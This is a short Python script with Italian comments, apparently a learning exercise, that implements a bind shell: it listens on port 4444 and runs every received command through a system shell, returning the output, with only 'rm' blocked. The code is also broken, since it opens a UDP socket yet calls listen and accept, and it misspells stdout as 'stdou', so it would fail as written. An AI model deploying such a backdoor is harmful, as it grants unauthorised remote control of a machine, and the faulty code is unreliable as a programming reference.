import socket as so         # IMPORTARE LIBRERIA "SOCKET"
import os
import subprocess

SRV_ADDR = ""               # QUALE MEC ANDRESS ASCOLTARE (IN QUESTO CASO TUTTI)
SRV_PORT = 4444             # DA QUALE PORTA COLLEGARSI
s = so.socket(so.AF_INET, so.SOCK_DGRAM)    # METTERSI IN CONTATTO
s.bind((SRV_ADDR, SRV_PORT))                # RISERVARE LA PORTA
s.listen(1)                                  # QUANTE PORTE ASCOLTARE
print("Sto attendenso una connessione...")
connection, address = s.accept()           # STABILIRE CONNESSIONE
print("Ho stabilito una connessione con: ", address)
percorso_partenza = os.getcwd()
while True:                                 # CREARE UN CICLO, INPUT, OUTPUT
    promt = percorso_partenza + "$ "
    connection.sendall(promt.encode("utf-8"))
    data = connection.recv(1024)                            # (1024) = PUÒ RICEVERE MASSIMO 1024 CARATTERI
    if not data: break                                      # USCIRE DALLA CONNESSIONE SE CI SONO ERRORI DI CONNESSIONE (INTERRUZZIONI ECC.)
    result = ""
    comando = data.decode("utf-8")
    if (comando.startswith('cd')):
        os.chdir(comando.replace("cd ","").replace('\n', ''))
        percorso_partenza = os.getcwd()
    elif (comando.startswith('rm')):
        result = "Ci hai provato!"
    else:
        res = subprocess.run(comando, cwd=percorso_partenza, shell=True, capture_output=True, text=True)
        result = res.stdou
        if(res.stderr): result = f"{result}\n{res.stderr}"
    result = result + "\n"
    connection.sendall(result.encode("utf-8"))    # INVIARE
connection.close()                                #CHIUDERE CONNESSIONE